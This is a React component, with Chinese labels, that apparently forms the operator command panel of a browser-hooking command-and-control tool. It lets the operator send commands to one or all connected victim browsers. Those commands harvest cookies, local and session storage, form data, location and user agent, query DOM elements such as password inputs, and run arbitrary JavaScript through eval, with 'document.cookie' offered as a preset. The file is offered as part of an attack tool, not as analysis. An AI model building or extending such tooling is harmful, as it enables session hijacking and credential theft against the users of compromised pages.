import React, { useState } from 'react';
import { Card, Button, Select, Input } from './ui';
import { useApi } from '../hooks/useApi';
import { COMMAND_TYPES } from '../types';
import './CommandPanel.css';

const CommandPanel = ({ selectedClient, onCommandResult }) => {
  const [selectedCommand, setSelectedCommand] = useState('');
  const [customCode, setCustomCode] = useState('');
  const [domSelector, setDomSelector] = useState('');
  const { sendCommandToAll, sendCommandToTarget, loading } = useApi();

  const commandOptions = [
    { value: COMMAND_TYPES.COOKIE, label: '获取 Cookie' },
    { value: COMMAND_TYPES.LOCATION, label: '获取位置信息' },
    { value: COMMAND_TYPES.LOCAL_STORAGE, label: '获取本地存储' },
    { value: COMMAND_TYPES.SESSION_STORAGE, label: '获取会话存储' },
    { value: COMMAND_TYPES.FORMS, label: '获取表单信息' },
    { value: COMMAND_TYPES.USER_AGENT, label: '获取用户代理' },
    { value: COMMAND_TYPES.DOM, label: '获取 DOM 元素' },
    { value: COMMAND_TYPES.EVAL, label: '执行 JavaScript' }
  ];

  const getCommandArgs = () => {
    const args = {};
    
    if (selectedCommand === COMMAND_TYPES.EVAL && customCode.trim()) {
      args.code = customCode.trim();
    }
    
    if (selectedCommand === COMMAND_TYPES.DOM && domSelector.trim()) {
      args.selector = domSelector.trim();
    }
    
    return args;
  };

  const handleExecuteCommand = async () => {
    if (!selectedCommand) {
      alert('请选择要执行的命令');
      return;
    }

    try {
      const args = getCommandArgs();
      let result;

      if (selectedClient) {
        result = await sendCommandToTarget(selectedClient.id, selectedCommand, args);
      } else {
        result = await sendCommandToAll(selectedCommand, args);
      }

      if (result.status === 'success' && onCommandResult) {
        onCommandResult(result.data);
      }
    } catch (error) {
      console.error('命令执行失败:', error);
      alert('命令执行失败: ' + error.message);
    }
  };

  const isExecuteDisabled = !selectedCommand || loading;

  return (
    <Card title="命令面板" className="command-panel">
      <div className="command-panel__form">
        <div className="command-panel__target">
          <div className="command-panel__target-label">执行目标:</div>
          <div className="command-panel__target-value">
            {selectedClient ? (
              <span className="command-panel__target-client">
                {selectedClient.id.slice(0, 8)}... (单个客户端)
              </span>
            ) : (
              <span className="command-panel__target-all">
                所有连接的客户端
              </span>
            )}
          </div>
        </div>

        <Select
          label="选择命令"
          value={selectedCommand}
          onChange={(e) => setSelectedCommand(e.target.value)}
          options={commandOptions}
          placeholder="请选择要执行的命令"
          required
        />

        {selectedCommand === COMMAND_TYPES.EVAL && (
          <div className="command-panel__code-input">
            <label className="command-panel__label">JavaScript 代码</label>
            <textarea
              className="command-panel__textarea"
              value={customCode}
              onChange={(e) => setCustomCode(e.target.value)}
              placeholder="输入要执行的 JavaScript 代码..."
              rows={4}
            />
            <div className="command-panel__code-examples">
              <div className="command-panel__examples-title">常用示例:</div>
              <button
                type="button"
                className="command-panel__example-btn"
                onClick={() => setCustomCode('document.title')}
              >
                获取页面标题
              </button>
              <button
                type="button"
                className="command-panel__example-btn"
                onClick={() => setCustomCode('window.location.href')}
              >
                获取当前URL
              </button>
              <button
                type="button"
                className="command-panel__example-btn"
                onClick={() => setCustomCode('document.cookie')}
              >
                获取Cookie
              </button>
            </div>
          </div>
        )}

        {selectedCommand === COMMAND_TYPES.DOM && (
          <Input
            label="CSS 选择器"
            value={domSelector}
            onChange={(e) => setDomSelector(e.target.value)}
            placeholder="例如: input[type=password], .username"
          />
        )}

        <div className="command-panel__actions">
          <Button
            variant="primary"
            onClick={handleExecuteCommand}
            disabled={isExecuteDisabled}
            loading={loading}
          >
            执行命令
          </Button>
          
          <Button
            variant="secondary"
            onClick={() => {
              setSelectedCommand('');
              setCustomCode('');
              setDomSelector('');
            }}
            disabled={loading}
          >
            清空
          </Button>
        </div>
      </div>
    </Card>
  );
};

export default CommandPanel;